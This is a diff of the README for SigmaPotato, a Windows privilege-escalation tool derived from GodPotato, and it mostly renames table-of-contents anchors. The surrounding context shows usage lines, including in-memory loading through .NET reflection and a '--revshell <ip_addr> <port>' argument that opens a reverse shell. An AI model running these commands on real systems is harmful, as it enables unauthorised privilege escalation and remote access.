@@ -7,21 +7,21 @@ and output verbosity for a more intuitive and effective user experience.
 ![Banner](https://cdn.discordapp.com/attachments/855920119292362802/1156633429950070905/image.png?ex=6515ae52&is=65145cd2&hm=4d074ce6dc39da8b268619f965c14539c60dcb9e0a1fb01dfcae68bdd1fe372c&)
 
 
-# Table of Contents <a name="tableContents"></a>
+# Table of Contents <a name="toc"></a>
 
-1. [**Added Functionality over the Original GodPotato**](#addedFunctionality)
-2. [**General Usage**](#generalUsage)
-    - [**Usage from Disk via the Binary**](#binaryUsage)
-	- [**Usage from Memory via .NET Reflection**](#reflectionUsage)
-	- [**Error Correction**](#errorCorrection)
+1. [**Added Functionality over the Original GodPotato**](#functionality)
+2. [**General Usage**](#usage)
+    - [**Usage from Disk via the Binary**](#binaries)
+	- [**Usage from Memory via .NET Reflection**](#reflection)
+	- [**Error Correction**](#errors)
 	- [**Examples**](#examples)
-3. [**Windows OS Version Compatibility**](#versionCompatiblity)
+3. [**Windows OS Version Compatibility**](#compatibility)
 4. [**Credits & Thanks**](#credits)
-	- [**BeichenDream**](#beichenDream)
-	- [**NukingDragons**](#nukingDragons)
+	- [**BeichenDream**](#beichendream)
+	- [**NukingDragons**](#nukingdragons)
 5. [**License**](#license)
 
-# Added Functionality over the Original GodPotato <a name="addedFunctionality"></a>
+# Added Functionality over the Original GodPotato <a name="functionality"></a>
 
 ## v1.0.0
 ```
@@ -80,10 +80,10 @@ and output verbosity for a more intuitive and effective user experience.
     o (will likely only be applicable when using reflection) 
 ```
 
-[**Return to Table of Contents**](#tableContents)
+[**Return to Table of Contents**](#toc)
 
 
-# General Usage <a name="generalUsage"></a>
+# General Usage <a name="usage"></a>
 
 **Requirements:**
 ```txt
@@ -94,10 +94,10 @@ Checking the help message with ``--help``
 
 ![Help](https://cdn.discordapp.com/attachments/855920119292362802/1156634215748730951/image.png?ex=6515af0e&is=65145d8e&hm=7cfacf49ff65f434e74590ed4d2e64433984a1b7970a9b2030fce94e0859ff6e&)
 
-[**Return to Table of Contents**](#tableContents)
+[**Return to Table of Contents**](#toc)
 
 
-## Usage from Disk via the Binary <a name="binaryUsage"></a>
+## Usage from Disk via the Binary <a name="binaries"></a>
 
 The easiest way to use ``SigmaPotato`` is by interacting with the binary like you would any other program.
 ```powershell
@@ -113,10 +113,10 @@ The easiest way to use ``SigmaPotato`` is by interacting with the binary like yo
 ./SigmaPotato.exe --help
 ```
 
-[**Return to Table of Contents**](#tableContents)
+[**Return to Table of Contents**](#toc)
 
 
-## Usage from Memory via .NET Reflection <a name="reflectionUsage"></a>
+## Usage from Memory via .NET Reflection <a name="reflection"></a>
 
 
 Prior to privilege escalation, we need to load ``SigmaPotato`` into memory using .NET reflection.
@@ -155,10 +155,10 @@ $RevShell = @("--revshell", "<ip_addr>", "<port>")
 ```
 - Note: as of ``v1.2.5``, execution no longer requires ``[SigmaPotato.Program]``
 
-[**Return to Table of Contents**](#tableContents)
+[**Return to Table of Contents**](#toc)
 
 
-## Error Correction <a name="errorCorrection"></a>
+## Error Correction <a name="errors"></a>
 
 
 I made an active effort to document the majority of errors I came accross.
@@ -193,7 +193,7 @@ PS C:\Users\JoeSchmoe> .\SigmaPotato.exe --revshell
 
 ![Invalid Privileges](https://cdn.discordapp.com/attachments/855920119292362802/1156637078499631224/image.png?ex=6515b1b8&is=65146038&hm=58b95348a4114bac583c6c5259a8c143b2c3f4f56bff8d9217a4c592c9d3e962&)
 
-[**Return to Table of Contents**](#tableContents)
+[**Return to Table of Contents**](#toc)
 
 
 ## Examples <a name="examples"></a>
@@ -212,10 +212,10 @@ Below are two examples of ``SigmaPotato.exe`` usage.
 
 ![Reflection w/ Custom Payload](https://cdn.discordapp.com/attachments/855920119292362802/1156640112030011412/image.png?ex=6515b48c&is=6514630c&hm=86d25d61fc18ddf6b4cb03ee5a3a898fd4ae7904ed5c5e08d3bb0c5c5f1777e4&)
 
-[**Return to Table of Contents**](#tableContents)
+[**Return to Table of Contents**](#toc)
 
 
-# Windows OS Version Compatibility <a name="versionCompatiblity"></a>
+# Windows OS Version Compatibility <a name="compatibility"></a>
 
 For this project I compiled two different binaries for maximum compatibility.  The default
 **``SigmaPotato.exe``** has been tested and validated on a fresh installation of every Windows
@@ -239,18 +239,18 @@ execution.  So if you plan to only use reflection, this version would be optimal
 | Windows 8/8.1 - Windows 11 |
 | Windows Server 2012 - Windows 2022 |
 
-[**Return to Table of Contents**](#tableContents)
+[**Return to Table of Contents**](#toc)
 
 
 # Credits & Thanks <a name="credits"></a>
 
 - Enormous credit to [@BeichenDream](https://github.com/BeichenDream) for the original [GodPotato](https://github.com/BeichenDream/GodPotato) project.  I couldn't have made any of this without his
-hard work. <a name="beichenDream"></a>
+hard work. <a name="beichendream"></a>
 
 - Huge shoutout to [@NukingDragons](https://github.com/nukingdragons) for being way smarter than me
-and helping with the local environment block bootstrap. <a name="nukingDragons"></a>
+and helping with the local environment block bootstrap. <a name="nukingdragons"></a>
 
-[**Return to Table of Contents**](#tableContents)
+[**Return to Table of Contents**](#toc)
 
 ---
 
